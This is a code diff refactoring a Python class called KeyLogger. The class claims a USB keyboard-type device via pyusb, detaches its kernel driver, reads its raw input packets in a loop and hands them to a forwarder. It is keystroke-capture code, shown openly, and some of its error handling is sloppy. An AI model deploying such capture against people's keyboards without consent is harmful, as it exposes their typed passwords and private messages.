@@ -25,39 +25,31 @@ class KeyLogger:
     def __find_device(self, with_device: str = "forward") -> Optional[usb.core.Device]:
         id_vendor: int = 0x1c4f
         device_id: int = 0x008b
-#        for device in self.__devices:
-#            # TODO set right device here
-#            print(f'{device}   233')
-#            if with_device == "forward":
-#                pass
-#            elif with_device == "receive":
-#                pass
         if id_vendor == 0 or device_id == 0:
-            # raise NoDeviceFound(self.__devices)
+            raise NoDeviceFound(self.__devices)
             pass
         else:
             try:
                 # Find the USB device
-                dev = usb.core.find(idVendor=id_vendor, idProduct=device_id)
-                if dev.is_kernel_driver_active(0):
+                device = usb.core.find(idVendor=id_vendor, idProduct=device_id)
+                if device.is_kernel_driver_active(0):
                     try:
-                        dev.detach_kernel_driver(0)
+                        device.detach_kernel_driver(0)
                     except usb.core.USBError as e:
                         print("Could not detach kernel driver: %s" % str(e))
-
                 # Release the device from any other processes
-                usb.util.dispose_resources(dev)
-
+                usb.util.dispose_resources(device)
                 # Check if the device is still busy
-                if dev.is_kernel_driver_active(0):
+
+                if device.is_kernel_driver_active(0):
                     print("Device is still busy, could not release resources")
                     logging.error("FEEEEEEEEEEEEEEEEEEHLER")
-#            device: Optional[usb.core.Device] = usb.core.find(
-#                idVendor=id_vendor, idProduct=device_id
-            except:
-                print("4848")
-#            )
-        return device
+                else:
+                    return device
+            except Exception as e:
+                logging.error(f"{e}")
+                return None
+
 
     @staticmethod
     def get_devices() -> list[[int, int]]:
@@ -75,25 +67,13 @@ class KeyLogger:
     # TODO: Rewrite this code
     def run(self):
         device =self.__find_device()
-        # # Geräteinformationen
-        # for device in self.__devices:
-        #     try:
-        #         vendor_id: int = device[0]
-        #         product_id: int = device[1]
-        #         # USB-Gerät finden
-        #         dev = usb.core.find(idVendor=vendor_id, idProduct=product_id)
-        #         if dev is None:
-        #             raise ValueError("USB-Device not found")
-        #         # USB-Gerät öffnen
-        #         dev.set_configuration()
-        #     except Exception as e:
-        #         logging.error(f"Error reading Vendor ID: {e}")
-
-        usb.util.claim_interface(dev, 0)
+        if device is None:
+            logging.error(f'Device is None in the run ')
+        usb.util.claim_interface(device, 0)
         try:
             # Endlosschleife zum Abhören des USB-Verkehrs
             while True:
-                data: any = dev.read(
+                data: any = device.read(
                     0x81, 64
                 )  # Endpoint-Adresse und Puffergröße anpassen
                 self.__USBForwarder.send_data(data)
@@ -101,5 +81,5 @@ class KeyLogger:
         except KeyboardInterrupt:
             pass
         finally:
-            usb.util.release_interface(dev, 0)
-            dev.reset()
+            usb.util.release_interface(device, 0)
+            device.reset()
